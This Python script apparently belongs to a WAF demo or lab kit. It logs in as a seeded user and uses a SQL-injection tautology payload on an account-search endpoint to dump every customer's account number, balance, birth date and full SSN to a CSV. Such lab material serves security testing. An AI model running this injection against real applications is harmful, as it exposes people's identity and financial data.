"""
sqli_dump.py — dump every account in one request via SQL injection.

Vuln / bot scenario:  GET /api/accounts/accounts/search?q=... builds raw SQL with
                      an f-string (no bound parameters). A tautology payload that
                      closes the string, forces OR '1'='1', and comments out the
                      rest returns EVERY row — full SSNs and all — in a single
                      request, regardless of ownership.
F5 XC category:       WAF / OWASP Top 10: SQL Injection.

The default payload is the one from the README:  x%' OR '1'='1' --
Logs in as any customer (a valid bearer token is required to reach the route),
sends one crafted request, and reports how many accounts came back vs. how many
a benign search returns.

Usage:
    python3 sqli_dump.py
    python3 sqli_dump.py --user bob --payload "x%' OR '1'='1' -- " --out dump.csv
"""

import argparse
import csv
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from config import (BASE_URL, SEEDED_USERS, auth_headers, login, make_client)

# Close the ILIKE string, force a tautology, comment out the trailing clause.
DEFAULT_PAYLOAD = "x%' OR '1'='1' -- "


def search(client, hdrs, q: str):
    r = client.get("/api/accounts/accounts/search", headers=hdrs, params={"q": q})
    return r


def main():
    ap = argparse.ArgumentParser(description="SQL-injection account-dump bot.")
    ap.add_argument("--user", default="alice", choices=list(SEEDED_USERS))
    ap.add_argument("--payload", default=DEFAULT_PAYLOAD)
    ap.add_argument("--out", default="sqli_dump.csv")
    args = ap.parse_args()

    creds = SEEDED_USERS[args.user]
    print(f"Target: {BASE_URL}/api/accounts/accounts/search  (logged in as {args.user})\n")

    with make_client() as client:
        token, _ = login(client, creds["email"], creds["password"])
        hdrs = auth_headers(token)

        # Baseline: a benign search that matches only the caller's own rows.
        benign = search(client, hdrs, "checking")
        benign_n = len(benign.json()) if benign.status_code == 200 else 0

        # The injection.
        inj = search(client, hdrs, args.payload)
        if inj.status_code != 200:
            print(f"injection request returned {inj.status_code} {inj.text[:120]}")
            return
        rows = inj.json()

    with open(args.out, "w", newline="") as f:
        w = csv.writer(f)
        w.writerow(["id", "account_number", "user_id", "currency", "balance_cents",
                    "date_of_birth", "ssn_full"])
        for a in rows:
            w.writerow([a.get("id"), a.get("account_number"), a.get("user_id"),
                        a.get("currency"), a.get("balance_cents"),
                        a.get("date_of_birth"), a.get("ssn_full")])

    print("--- report ---")
    print(f"benign search 'checking': {benign_n} row(s)")
    print(f"injected payload {args.payload!r}: {len(rows)} row(s) -> {args.out}")
    print(f"one request leaked {len(rows)} accounts across "
          f"{len({a.get('user_id') for a in rows})} distinct users.\n")
    print("sample dumped records (SSN truncated for the console; full value in CSV):")
    for a in rows[:5]:
        ssn = str(a.get("ssn_full", ""))
        masked = ("***-**-" + ssn[-4:]) if len(ssn) >= 4 else ssn
        print(f"  acct {a.get('id'):>3} {a.get('account_number'):<14} "
              f"{a.get('currency')} {a.get('balance_cents'):>10}  ssn={masked}")


if __name__ == "__main__":
    main()
